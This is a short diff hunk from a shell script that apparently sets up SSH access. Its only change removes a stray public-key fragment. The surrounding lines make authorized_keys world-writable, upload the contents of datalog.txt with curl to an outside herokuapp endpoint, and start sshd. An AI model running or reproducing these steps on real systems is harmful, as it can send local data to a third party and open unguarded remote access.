@@ -21,5 +21,5 @@ chmod 777 authorized_keys ;
 echo "STEP 4 >>>> Configured key";
 output3=$(cat datalog.txt);
 curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output3";
-curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="completed";OlKfyksWnFnnr6ToxDFGouGsEcrop6F39VgW6F5aix5n4kopKMIktb/08Q8e16Ji365rf/SJeRxSwswqRawS27MzURAk7KgEp/EuRXm5uIe0= root@adarshbp
+curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="completed";
 sshd
